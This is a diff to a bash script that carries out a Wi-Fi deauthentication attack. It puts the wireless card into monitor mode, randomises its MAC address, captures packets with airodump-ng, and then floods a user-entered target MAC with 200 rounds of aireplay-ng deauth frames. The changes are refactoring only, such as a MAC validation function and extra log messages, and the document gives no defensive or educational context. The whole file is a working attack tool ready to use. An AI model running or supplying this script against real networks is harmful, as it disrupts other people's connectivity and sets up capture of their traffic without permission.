@@ -1,13 +1,13 @@
 #!/bin/bash
 
-set -e  # Exit immediately if a command exits with a non-zero status
+# Exit immediately if a command exits with a non-zero status
+set -e
 
 # Function to clean up and exit
 cleanup() {
     echo "Cleaning up..."
     airmon-ng stop wlan0mon &>/dev/null || true
     service network-manager restart &>/dev/null || true
-    exit
 }
 
 # Set trap to call cleanup function on script exit
@@ -15,7 +15,18 @@ trap cleanup EXIT
 
 # Function to run a command with timeout and error handling
 run_command() {
-    timeout 30s "$@" || { echo "Error: Command '$*' failed or timed out"; return 1; }
+    local cmd="$*"
+    echo "Running: $cmd"
+    timeout 30s bash -c "$cmd" || {
+        echo "Error: Command '$cmd' failed or timed out"
+        return 1
+    }
+}
+
+# Function to validate MAC address format
+validate_mac_address() {
+    local mac="$1"
+    [[ $mac =~ ^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$ ]]
 }
 
 # Check if script is run as root
@@ -28,8 +39,8 @@ fi
 read -p "Enter the target MAC address: " TARGET_MAC
 
 # Validate MAC address format
-if ! [[ $TARGET_MAC =~ ^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$ ]]; then
-    echo "Invalid MAC address format. Please use XX:XX:XX:XX:XX:XX"
+if ! validate_mac_address "$TARGET_MAC"; then
+    echo "Invalid MAC address format. Please use XX:XX:XX:XX:XX:XX."
     exit 1
 fi
 
@@ -44,17 +55,20 @@ run_command macchanger -r wlan0mon
 sleep 2
 run_command ifconfig wlan0mon up
 
-# Start packet capture
+# Start packet capture in the background
 run_command airodump-ng wlan0mon -c 6 &
 AIRODUMP_PID=$!
 
-# Deauth loop
+# Perform deauthentication loop
+echo "Starting deauthentication attack..."
 for i in {1..200}; do
     run_command aireplay-ng --deauth 5 -a "$TARGET_MAC" wlan0mon
     sleep 5
 done
 
-# Kill airodump-ng
-kill $AIRODUMP_PID
+# Terminate packet capture process
+echo "Stopping packet capture..."
+kill "$AIRODUMP_PID" &>/dev/null || true
 
 # Cleanup is handled by the trap
+echo "Script execution completed."
